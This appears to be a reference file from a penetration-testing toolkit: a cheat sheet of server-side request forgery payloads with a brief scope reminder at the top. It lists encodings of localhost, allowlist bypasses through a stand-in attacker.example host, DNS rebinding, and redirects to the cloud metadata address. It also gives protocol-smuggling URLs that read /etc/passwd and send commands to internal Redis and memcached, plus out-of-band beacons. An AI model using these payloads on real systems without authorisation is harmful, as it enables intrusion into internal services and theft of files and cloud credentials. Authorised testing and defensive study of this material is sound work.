# SSRF payloads, bypasses, protocols (shared by ssrf-inband / blind / cloud)
# Stay in scope. Confirm a fetch benignly before aiming at internal/metadata targets.

## Internal target forms
```
http://127.0.0.1/            http://localhost/         http://0.0.0.0/
http://[::1]/                http://127.1/             http://0x7f000001/   (hex)
http://2130706433/           (decimal 127.0.0.1)
http://INTERNAL_IP/          (in-scope internal ranges from scope.yaml)
```

## Allowlist / parser bypasses
```
http://ALLOWED@attacker.example/            # userinfo trick
http://attacker.example#ALLOWED             # fragment
http://attacker.example/ALLOWED
http://ALLOWED.attacker.example             # suffix confusion
http://127.0.0.1:80\@ALLOWED/
http://ⓛocalhost/                           # unicode / IDN
http://localtest.me/  http://*.nip.io       # DNS that resolves to an IP you pick
DNS rebinding: a host that resolves ALLOWED on check, INTERNAL on fetch (TOCTOU)
redirect: an allowed URL that 301→ http://169.254.169.254/ (if the sink follows redirects)
```

## Protocol smuggling (if the sink accepts non-http)
```
file:///etc/passwd                          # local file read
gopher://127.0.0.1:6379/_<redis commands>   # talk to internal TCP services (Redis, etc.)
dict://127.0.0.1:11211/stats                # memcached
http://127.0.0.1:INTERNAL_PORT/             # port-scan internal services via response/timing
```

## Blind confirmation
Use an OOB beacon in the URL (`http://TOKEN.oob.example/`) so a server fetch is attributable even
with no in-band reflection. For protocol/port probing without reflection, use timing differentials.

See `ssrf-cloud/refs/metadata_endpoints.md` for cloud metadata targets.
